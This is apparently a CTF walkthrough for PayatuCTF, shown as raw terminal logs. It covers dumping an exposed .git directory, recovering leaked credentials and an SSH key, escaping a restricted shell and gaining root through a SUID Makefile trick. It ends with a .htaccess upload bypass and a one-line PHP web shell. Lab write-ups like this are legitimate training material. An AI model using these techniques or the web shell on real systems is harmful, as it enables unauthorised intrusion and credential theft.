---
title: "PayatuCTF"
description: "C-Mobile"
icon: "article"
date: "2025-12-10"
lastmod: "2025-12-10"
draft: false
toc: true
weight: 999
---


```bash
Author: Abu
```

## Infrastructure

### Legacy Leaks

```bash
┌──(abu㉿Winbu)-[/mnt/c/Users/abura]
└─$ ssh ctfuser@13.201.66.90 -p 54302
The authenticity of host '[13.201.66.90]:54302 ([13.201.66.90]:54302)' can't be established.
ED25519 key fingerprint is SHA256:yR2VZp+SJvtzyrH+NtPDUMwL3rx0OKmz6lNIXW4l8xo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[13.201.66.90]:54302' (ED25519) to the list of known hosts.
ctfuser@13.201.66.90's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 4.14.355-277.647.amzn2.x86_64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

=== Legacy Leak Challenge ===
Target Server: 172.20.0.3 (target.local)
ctfuser@b013807965a6:~$ ls
ctfuser@b013807965a6:~$ ls -la
total 16
drwxr-xr-x 1 ctfuser ctfuser   20 Jun 28 05:39 .
drwxr-xr-x 1 root    root      21 Jun 27 14:26 ..
-rw-r--r-- 1 ctfuser ctfuser  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ctfuser ctfuser 4722 Jun 27 14:26 .bashrc
drwx------ 2 ctfuser ctfuser   34 Jun 28 05:39 .cache
-rw-r--r-- 1 ctfuser ctfuser  807 Feb 25  2020 .profile
ctfuser@b013807965a6:~$ cat .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
export JUMP_IP="172.20.0.2"
export TARGET_IP="172.20.0.3"
export TARGET_HOST="target.local"
export WORDLISTS="/usr/share/wordlists"
alias scan="nmap -sV \$TARGET_IP"
alias scan-host="nmap -sV target.local"
alias dirsearch-web="dirsearch -u http://\$TARGET_IP:5000"
alias dirsearch-ext="dirsearch -u http://\$TARGET_IP:5000 -e php,txt,html,env,git"
alias gobuster-web="gobuster dir -u http://\$TARGET_IP:5000 -w \$WORDLISTS/common.txt"
alias dirb-web="dirb http://\$TARGET_IP:5000 \$WORDLISTS/common.txt"
alias git-dump="git-dumper http://\$TARGET_IP:5000/.git"
alias ssh-fix="chmod 600"
alias enum4linux-scan="enum4linux -a \$TARGET_IP"
alias enum4linux-ng-scan="enum4linux-ng -A \$TARGET_IP"
alias smbmap-scan="smbmap -H \$TARGET_IP"
alias target-ip="echo \$TARGET_IP"
alias target-info="echo \"Jump Server: \$JUMP_IP | Target Server: \$TARGET_IP (target.local)\""
echo "=== Legacy Leak Challenge ==="
echo "Target Server: 172.20.0.3 (target.local)"
ctfuser@b013807965a6:~$ hostname -I
172.17.0.10 
ctfuser@b013807965a6:~$ ping 172.20.0.3
PING 172.20.0.3 (172.20.0.3) 56(84) bytes of data.
64 bytes from 172.20.0.3: icmp_seq=1 ttl=255 time=0.014 ms
^C
--- 172.20.0.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.014/0.014/0.014/0.000 ms
ctfuser@b013807965a6:~$ cat .profile 
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
        . "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
ctfuser@b013807965a6:~$ curl -i 172.20.0.3:5000
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.10
Date: Sat, 28 Jun 2025 05:41:39 GMT
Content-type: text/html

<!DOCTYPE html>
<html>
<head>
    <title>SecureCorp Backup System</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .header { color: #2c3e50; }
        .note { background: #f8f9fa; padding: 15px; border-left: 4px solid #007bff; }
    </style>
</head>
<body>
    <h1 class="header">SecureCorp Backup System</h1>
    <p>Welcome to our secure backup management portal.</p>
    <div class="note">
        <p><strong>For Developers:</strong></p>
        <p>Development configuration files may be accessible.</p>
        <p>Contact: developer@securecorp.com</p>
    </div>
    <hr>
    <p><small>v1.0 - Internal Development Build</small></p>
</body>
</html>ctfuser@b013807965a6:~$ dirsearch-ext

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html, env, git | HTTP method: GET | Threads: 25 | Wordlist size: 11466

Output File: /home/ctfuser/reports/http_172.20.0.3_5000/_25-06-28_05-42-20.txt

Target: http://172.20.0.3:5000/

[05:42:20] Starting: 
[05:42:21] 200 -   52B  - /.env
[05:42:21] 200 -   29B  - /.git/COMMIT_EDITMSG
[05:42:21] 200 -  142B  - /.git/config
[05:42:21] 200 -   23B  - /.git/HEAD
[05:42:21] 200 -   73B  - /.git/description
[05:42:21] 200 -  297B  - /.git/index
[05:42:21] 200 -  240B  - /.git/info/exclude
[05:42:21] 200 -   41B  - /.git/refs/heads/master

Task Completed
ctfuser@b013807965a6:~$ git-dump
usage: git-dumper [options] URL DIR
git-dumper: error: the following arguments are required: DIR
ctfuser@b013807965a6:~$ git-dumper http://$TARGET_IP:5000/.git ~/gitdump
[-] Testing http://172.20.0.3:5000/.git/HEAD [200]
[-] Testing http://172.20.0.3:5000/.git/ [404]
[-] Fetching common files
[-] Fetching http://172.20.0.3:5000/.gitignore [404]
[-] http://172.20.0.3:5000/.gitignore responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/COMMIT_EDITMSG [200]
[-] Fetching http://172.20.0.3:5000/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://172.20.0.3:5000/.git/description [200]
[-] Fetching http://172.20.0.3:5000/.git/hooks/post-commit.sample [404]
[-] http://172.20.0.3:5000/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/hooks/post-receive.sample [404]
[-] http://172.20.0.3:5000/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/hooks/post-update.sample [200]
[-] Fetching http://172.20.0.3:5000/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://172.20.0.3:5000/.git/hooks/pre-commit.sample [200]
[-] Fetching http://172.20.0.3:5000/.git/hooks/pre-push.sample [200]
[-] Fetching http://172.20.0.3:5000/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://172.20.0.3:5000/.git/hooks/pre-receive.sample [200]
[-] Fetching http://172.20.0.3:5000/.git/hooks/update.sample [200]
[-] Fetching http://172.20.0.3:5000/.git/index [200]
[-] Fetching http://172.20.0.3:5000/.git/info/exclude [200]
[-] Fetching http://172.20.0.3:5000/.git/objects/info/packs [404]
[-] http://172.20.0.3:5000/.git/objects/info/packs responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/hooks/commit-msg.sample [200]
[-] Fetching http://172.20.0.3:5000/.git/hooks/prepare-commit-msg.sample [200]
[-] Finding refs/
[-] Fetching http://172.20.0.3:5000/.git/FETCH_HEAD [404]
[-] http://172.20.0.3:5000/.git/FETCH_HEAD responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/HEAD [200]
[-] Fetching http://172.20.0.3:5000/.git/ORIG_HEAD [404]
[-] http://172.20.0.3:5000/.git/ORIG_HEAD responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/info/refs [404]
[-] Fetching http://172.20.0.3:5000/.git/logs/refs/heads/master [404]
[-] http://172.20.0.3:5000/.git/logs/refs/heads/master responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/logs/refs/heads/production [404]
[-] http://172.20.0.3:5000/.git/logs/refs/heads/production responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/logs/refs/heads/staging [404]
[-] http://172.20.0.3:5000/.git/logs/refs/heads/staging responded with status code 404
[-] http://172.20.0.3:5000/.git/info/refs responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/logs/HEAD [404]
[-] http://172.20.0.3:5000/.git/logs/HEAD responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/logs/refs/heads/development [404]
[-] http://172.20.0.3:5000/.git/logs/refs/heads/development responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/logs/refs/remotes/origin/HEAD [404]
[-] http://172.20.0.3:5000/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/logs/refs/remotes/origin/main [404]
[-] http://172.20.0.3:5000/.git/logs/refs/remotes/origin/main responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/logs/refs/remotes/origin/development [404]
[-] http://172.20.0.3:5000/.git/logs/refs/remotes/origin/development responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/logs/refs/remotes/origin/production [404]
[-] http://172.20.0.3:5000/.git/logs/refs/remotes/origin/production responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/logs/refs/remotes/origin/master [404]
[-] http://172.20.0.3:5000/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/packed-refs [404]
[-] http://172.20.0.3:5000/.git/packed-refs responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/logs/refs/stash [404]
[-] http://172.20.0.3:5000/.git/logs/refs/stash responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/logs/refs/remotes/origin/staging [404]
[-] http://172.20.0.3:5000/.git/logs/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/heads/master [200]
[-] Fetching http://172.20.0.3:5000/.git/refs/heads/staging [404]
[-] Fetching http://172.20.0.3:5000/.git/refs/heads/production [404]
[-] http://172.20.0.3:5000/.git/refs/heads/production responded with status code 404
[-] http://172.20.0.3:5000/.git/refs/heads/staging responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/heads/development [404]
[-] http://172.20.0.3:5000/.git/refs/heads/development responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/remotes/origin/HEAD [404]
[-] http://172.20.0.3:5000/.git/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/remotes/origin/main [404]
[-] Fetching http://172.20.0.3:5000/.git/logs/refs/heads/main [404]
[-] http://172.20.0.3:5000/.git/refs/remotes/origin/main responded with status code 404
[-] http://172.20.0.3:5000/.git/logs/refs/heads/main responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/remotes/origin/staging [404]
[-] http://172.20.0.3:5000/.git/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/remotes/origin/master [404]
[-] Fetching http://172.20.0.3:5000/.git/refs/remotes/origin/development [404]
[-] http://172.20.0.3:5000/.git/refs/remotes/origin/development responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/remotes/origin/production [404]
[-] http://172.20.0.3:5000/.git/refs/remotes/origin/production responded with status code 404
[-] http://172.20.0.3:5000/.git/refs/remotes/origin/master responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/heads/main [404]
[-] http://172.20.0.3:5000/.git/refs/heads/main responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/stash [404]
[-] http://172.20.0.3:5000/.git/refs/stash responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/wip/wtree/refs/heads/main [404]
[-] http://172.20.0.3:5000/.git/refs/wip/wtree/refs/heads/main responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/wip/wtree/refs/heads/master [404]
[-] http://172.20.0.3:5000/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/wip/wtree/refs/heads/staging [404]
[-] http://172.20.0.3:5000/.git/refs/wip/wtree/refs/heads/staging responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/wip/wtree/refs/heads/production [404]
[-] http://172.20.0.3:5000/.git/refs/wip/wtree/refs/heads/production responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/wip/index/refs/heads/main [404]
[-] http://172.20.0.3:5000/.git/refs/wip/index/refs/heads/main responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/wip/index/refs/heads/staging [404]
[-] http://172.20.0.3:5000/.git/refs/wip/index/refs/heads/staging responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/wip/index/refs/heads/production [404]
[-] http://172.20.0.3:5000/.git/refs/wip/index/refs/heads/production responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/wip/wtree/refs/heads/development [404]
[-] http://172.20.0.3:5000/.git/refs/wip/wtree/refs/heads/development responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/wip/index/refs/heads/master [404]
[-] http://172.20.0.3:5000/.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/refs/wip/index/refs/heads/development [404]
[-] http://172.20.0.3:5000/.git/refs/wip/index/refs/heads/development responded with status code 404
[-] Fetching http://172.20.0.3:5000/.git/config [200]
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://172.20.0.3:5000/.git/objects/3e/0ff2000331fffdd1ed9805da353cd68209bfa6 [200]
[-] Fetching http://172.20.0.3:5000/.git/objects/29/28f908a370f6a5ab1bd2ef8b5f249c3668d393 [200]
[-] Fetching http://172.20.0.3:5000/.git/objects/0d/a3aa4a0df6debc5008009b95cb871c29bc9a07 [200]
[-] Fetching http://172.20.0.3:5000/.git/objects/1c/4021fcb0d026fef1f6a45c3158c631883a188b [200]
[-] Fetching http://172.20.0.3:5000/.git/objects/c3/eac991c6113c2440eab4b34f1e58e9ca06e9a4 [200]
[-] Fetching http://172.20.0.3:5000/.git/objects/7c/3481f028f5bb7d453282b1acca11824d30bb94 [200]
[-] Fetching http://172.20.0.3:5000/.git/objects/5a/8aaccde73148724db701e30f22791f46b27bde [200]
[-] Fetching http://172.20.0.3:5000/.git/objects/ca/1299bc015d771fbef31e112d4bc1c1a58b1667 [200]
[-] Fetching http://172.20.0.3:5000/.git/objects/d9/681239151adaa5a78d24473f6688c10bf4dd07 [200]
[-] Fetching http://172.20.0.3:5000/.git/objects/97/49bc9678efff7eed2f6fe0bfb58ac3c6b9c824 [200]
[-] Fetching http://172.20.0.3:5000/.git/objects/4e/3c6f411fb056c80494ea2f6f509c35f4cfa2ee [200]
[-] Fetching http://172.20.0.3:5000/.git/objects/8d/b63d352cc5aee591279287ee00701f54ba95dc [200]
[-] Running git checkout .
ctfuser@b013807965a6:~$ cd ~/gitdump/
ctfuser@b013807965a6:~/gitdump$ ls
README.md  config.txt  security.conf
ctfuser@b013807965a6:~/gitdump$ cat README.md 
# SecureCorp Backup System
ctfuser@b013807965a6:~/gitdump$ cat config.txt 
# Development Configuration
ctfuser@b013807965a6:~/gitdump$ cat security.conf 
# Security Settings
SSL_ENABLED=true
SESSION_TIMEOUT=3600
ctfuser@b013807965a6:~/gitdump$ ls -la
total 12
drwxrwxr-x 3 ctfuser ctfuser  74 Jun 28 05:44 .
drwxr-xr-x 1 ctfuser ctfuser  50 Jun 28 05:44 ..
drwxrwxr-x 6 ctfuser ctfuser 138 Jun 28 05:44 .git
-rw-rw-r-- 1 ctfuser ctfuser  27 Jun 28 05:44 README.md
-rw-rw-r-- 1 ctfuser ctfuser  28 Jun 28 05:44 config.txt
-rw-rw-r-- 1 ctfuser ctfuser  58 Jun 28 05:44 security.conf
ctfuser@b013807965a6:~/gitdump$ git log
commit 3e0ff2000331fffdd1ed9805da353cd68209bfa6 (HEAD -> master)
Author: developer <dev@company.com>
Date:   Fri Jun 27 14:26:02 2025 +0000

    Remove build key from config

commit c3eac991c6113c2440eab4b34f1e58e9ca06e9a4
Author: developer <dev@company.com>
Date:   Fri Jun 27 14:26:02 2025 +0000

    Add security configuration

commit 5a8aaccde73148724db701e30f22791f46b27bde
Author: developer <dev@company.com>
Date:   Fri Jun 27 14:26:02 2025 +0000

    Add database configuration

commit 4e3c6f411fb056c80494ea2f6f509c35f4cfa2ee
Author: developer <dev@company.com>
Date:   Fri Jun 27 14:26:02 2025 +0000

    Initial project setup
ctfuser@b013807965a6:~/gitdump$ git log --oneline
3e0ff20 (HEAD -> master) Remove build key from config
c3eac99 Add security configuration
5a8aacc Add database configuration
4e3c6f4 Initial project setup
ctfuser@b013807965a6:~/gitdump$ git log -p
commit 3e0ff2000331fffdd1ed9805da353cd68209bfa6 (HEAD -> master)
Author: developer <dev@company.com>
Date:   Fri Jun 27 14:26:02 2025 +0000

    Remove build key from config

diff --git a/security.conf b/security.conf
index 9749bc9..1c4021f 100644
--- a/security.conf
+++ b/security.conf
@@ -1,4 +1,3 @@
 # Security Settings
 SSL_ENABLED=true
 SESSION_TIMEOUT=3600
-BUILD_KEY=S3cur3!K3y@2024#B@ckup

commit c3eac991c6113c2440eab4b34f1e58e9ca06e9a4
Author: developer <dev@company.com>
Date:   Fri Jun 27 14:26:02 2025 +0000

    Add security configuration

diff --git a/security.conf b/security.conf
new file mode 100644
index 0000000..9749bc9
--- /dev/null
+++ b/security.conf
@@ -0,0 +1,4 @@
+# Security Settings
+SSL_ENABLED=true
+SESSION_TIMEOUT=3600
+BUILD_KEY=ssh -i id_rsa user1@172.20.0.3 "bash -i"

commit 5a8aaccde73148724db701e30f22791f46b27bde
Author: developer <dev@company.com>
Date:   Fri Jun 27 14:26:02 2025 +0000

    Add database configuration

diff --git a/config.txt b/config.txt
new file mode 100644
index 0000000..2928f90
--- /dev/null
+++ b/config.txt
@@ -0,0 +1 @@
+# Development Configuration

commit 4e3c6f411fb056c80494ea2f6f509c35f4cfa2ee
Author: developer <dev@company.com>
Date:   Fri Jun 27 14:26:02 2025 +0000

    Initial project setup

diff --git a/README.md b/README.md
new file mode 100644
index 0000000..0da3aa4
--- /dev/null
+++ b/README.md
@@ -0,0 +1 @@
+# SecureCorp Backup System
ctfuser@b013807965a6:~/gitdump$ curl http://$TARGET_IP:5000/.env
FTP_USERNAME=ftpuser
FTP_PASSWORD=ftp_p@ssw0rd_2024
ctfuser@b013807965a6:~/gitdump$ ftp $TARGET_IP
Connected to 172.20.0.3.
220 (vsFTPd 3.0.5)
Name (172.20.0.3:ctfuser):  
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> ls
530 Please login with USER and PASS.
ftp: bind: Address already in use
ftp> ^C
ftp> ^C
ftp> exit
221 Goodbye.
ctfuser@b013807965a6:~/gitdump$ ftp $TARGET_IP
Connected to 172.20.0.3.
220 (vsFTPd 3.0.5)
Name (172.20.0.3:ctfuser): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           50 Jun 27 14:26 flag1.txt
-rw-r--r--    1 1001     1001          412 Jun 27 14:26 note.txt
226 Directory send OK.
ftp> get flag1.txt
local: flag1.txt remote: flag1.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag1.txt (50 bytes).
226 Transfer complete.
50 bytes received in 0.00 secs (1.0145 MB/s)
ftp> exit
221 Goodbye.
ctfuser@b013807965a6:~/gitdump$ cat flag1.txt 
PAYATU{f7p_4cc355_gr4n73d_n0w_f1nd_7h3_n3x7_573p}
```

### 2

```bash
ctfuser@cb17f6bfc4c6:~$ cat note.txt 
Congratulations on accessing the FTP server!

Here are some important notes:

1. The next step involves network file sharing
2. Credentials are encoded for security: NDIwMm96Zl9xZWJqZmZuYzplcmZob3pm
3. Remember to try different decoding methods if the first does not work
4. The share name is backup_share

Hint: The encoding uses multiple transformations "reverse" is the key

Good luck with the next challenge!

ctfuser@cb17f6bfc4c6:~$ echo cnffjbeq_cfzo2024 | tr 'A-Za-z' 'N-ZA-Mn-za-m'
password_smb2024
ctfuser@cb17f6bfc4c6:~$ echo fzohfre | tr 'A-Za-z' 'N-ZA-Mn-za-m'
smbuser

ctfuser@cb17f6bfc4c6:~$ smbclient //172.20.0.3/backup_share -U smbuser
lpcfg_do_global_parameter: WARNING: The "syslog" option is deprecated
Password for [WORKGROUP\smbuser]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun 27 14:26:03 2025
  ..                                  D        0  Fri Jun 27 14:26:03 2025
  flags                               D        0  Fri Jun 27 14:26:03 2025
  user_backup                         D        0  Fri Jun 27 14:26:03 2025

                20959212 blocks of size 1024. 10100420 blocks available
smb: \> cd flags
smb: \flags\> ls
  .                                   D        0  Fri Jun 27 14:26:03 2025
  ..                                  D        0  Fri Jun 27 14:26:03 2025
  flag2.txt                           N       44  Fri Jun 27 14:26:03 2025

                20959212 blocks of size 1024. 10100140 blocks available
smb: \flags\> get flag2.txt
getting file \flags\flag2.txt of size 44 as flag2.txt (43.0 KiloBytes/sec) (average 43.0 KiloBytes/sec)
smb: \flags\> ls
  .                                   D        0  Fri Jun 27 14:26:03 2025
  ..                                  D        0  Fri Jun 27 14:26:03 2025
  flag2.txt                           N       44  Fri Jun 27 14:26:03 2025

                20959212 blocks of size 1024. 10099340 blocks available
smb: \flags\> cd ..
smb: \> ls
  .                                   D        0  Fri Jun 27 14:26:03 2025
  ..                                  D        0  Fri Jun 27 14:26:03 2025
  flags                               D        0  Fri Jun 27 14:26:03 2025
  user_backup                         D        0  Fri Jun 27 14:26:03 2025

                20959212 blocks of size 1024. 10099464 blocks available
smb: \> cd user_backup\
smb: \user_backup\> ls
  .                                   D        0  Fri Jun 27 14:26:03 2025
  ..                                  D        0  Fri Jun 27 14:26:03 2025
  .ssh                               DH        0  Fri Jun 27 14:26:03 2025

                20959212 blocks of size 1024. 10099464 blocks available
smb: \user_backup\> get .ssh
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \user_backup\.ssh
smb: \user_backup\> cd .ssh
smb: \user_backup\.ssh\> ls
  .                                   D        0  Fri Jun 27 14:26:03 2025
  ..                                  D        0  Fri Jun 27 14:26:03 2025
  id_rsa                              N     1876  Fri Jun 27 14:26:03 2025

                20959212 blocks of size 1024. 10098240 blocks available
smb: \user_backup\.ssh\> get id_rsa
getting file \user_backup\.ssh\id_rsa of size 1876 as id_rsa (1831.9 KiloBytes/sec) (average 937.5 KiloBytes/sec)
```

### 3/4

`S3cur3!K3y@2024#B@ckup`

[Linux Previlige Escalation-->Escaping Restricted shells](https://forum.hackthebox.com/t/linux-previlige-escalation-escaping-restricted-shells/290293/9)

```bash
user1@e71cffd01810:~$ echo $(< ../user2/flag4.txt)
PAYATU{u53r2_4cc355_gr4n73d_n0w_35c4l473_pr1v1l3g35}
user1@e71cffd01810:~$ echo ../../opt/*
../../opt/backup ../../opt/enum4linux-ng
user1@e71cffd01810:~$ echo ../../opt/backup/*
../../opt/backup/flag3.txt ../../opt/backup/id_rsa
user1@e71cffd01810:~$ echo $(< ../../opt/backup/flag3.txt)
PAYATU{r357r1c73d_5h3ll_byp4553d_n0w_g37_r007}
```

### 5

use the `id_rsa` from the `/opt/backup/id_rsa` and login as user2 who doesn’t have an rbash shell, using the same password [`S3cur3!K3y@2024#B@ckup`], this part has a bit of luck involved.

```
ctfuser@cbac52017e05:~$ ssh -i id_rsa user2@target.local
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 4.14.355-277.647.amzn2.x86_64 x86_64)

user2@cbac52017e05:~$ ls
flag4.txt

```

```bash
user2@cbac52017e05:/tmp$ /usr/bin/make -f Makefile
chmod +s /bin/dash
user2@cbac52017e05:/tmp$ /bin/dash -p
# whoami
root
# cd /root
# ls
final_flag.txt
# cat final_flag.txt
PAYATU{c0ngr4tul4t10n5_y0u_h4v3_c0mpl373d_4ll_ch4ll3ng35}
```

### 6

```bash
┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu]
└─$ curl -X POST http://3.109.183.13:52772/upload.php \
  -H "Content-Type: multipart/form-data; boundary=----abu" \
  --data-binary $'------abu\r\nContent-Disposition: form-data; name="file"; filename=".htaccess"\r\nContent-Type: text/plain\r\n\r\nAddType application/x-httpd-php .jpg\r\n------abu--'
<!DOCTYPE html><html><head><title>Upload Successful - SecureFile Portal</title><style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; }
        .container { background: rgba(255,255,255,0.97); padding: 40px 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); max-width: 420px; text-align: center; }
        .success-icon { font-size: 3rem; color: #48bb78; margin-bottom: 10px; }
        h2 { color: #2d3748; margin-bottom: 10px; }
        .file-info { color: #4a5568; margin: 18px 0 28px 0; font-size: 1.05rem; }
        .btn { display: inline-block; background: linear-gradient(45deg, #667eea, #764ba2); color: white; padding: 12px 32px; border-radius: 50px; text-decoration: none; font-weight: 600; margin: 10px 8px; transition: all 0.2s; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
        .btn:hover { background: linear-gradient(45deg, #764ba2, #667eea); }
        </style></head><body><div class="container"><div class="success-icon">✔️</div><h2>File Uploaded Successfully</h2><div class="file-info"">Your file <strong>.htaccess</strong> has been securely uploaded.<br>Location: <code>/images/.htaccess</code></div><a href="upload.php" class="btn">Upload Another File</a><a href="index.html" class="btn">Back to Portal</a></div></body></html>
┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu]
└─$ echo "<?php system(\$_GET['cmd']); ?>" > shell.jpg
curl -F "file=@shell.jpg" http://3.109.183.13:52772/upload.php
